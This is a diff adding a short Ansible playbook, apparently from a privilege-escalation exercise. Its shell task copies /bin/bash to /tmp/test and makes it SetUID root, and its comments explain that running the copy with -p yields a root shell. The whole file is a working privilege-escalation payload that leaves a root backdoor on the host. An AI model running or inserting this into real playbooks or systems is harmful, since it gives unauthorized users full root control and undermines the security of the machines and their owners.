@@ -1,0 +1,7 @@
+# This playbook copies /bin/bash to /tmp/test. When the playbook is being run by root, the /bin/bash copy is owned by root with the SetUID bit enabled.
+# When the script is triggered with -p (to maintain privs), you will be root
+
+- hosts: localhost
+  tasks:
+  - name: 'Duradin owns inject'
+    shell: cp /bin/bash /tmp/test; chmod 4755 /tmp/test 
